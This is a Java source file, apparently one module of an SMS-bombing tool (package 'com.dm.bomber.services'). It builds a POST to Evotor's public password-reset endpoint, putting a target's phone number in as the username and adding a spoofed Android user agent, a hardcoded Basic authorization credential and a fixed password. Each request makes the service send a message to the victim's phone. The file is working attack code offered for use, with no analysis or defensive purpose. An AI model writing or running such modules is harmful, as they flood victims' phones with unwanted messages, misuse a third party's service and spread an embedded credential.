package com.dm.bomber.services;

import okhttp3.FormBody;
import okhttp3.Request;

public class Evotor extends FormService {

    public Evotor() {
        setUrl("https://market.evotor.ru/api/v1/account/public/pwd/reset");
        setMethod(POST);
        setPhoneCode("7");
    }

    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("User-Agent", "Evo-Android");
        builder.addHeader("X-Authorization", "Basic RXZvLUFuZHJvaWQ6c2VjcmV0");

        return super.buildRequest(builder);
    }

    @Override
    public void buildBody(FormBody.Builder builder) {
        builder.add("username", getFormattedPhone());
        builder.add("password", "123123A@skzn");
    }
}
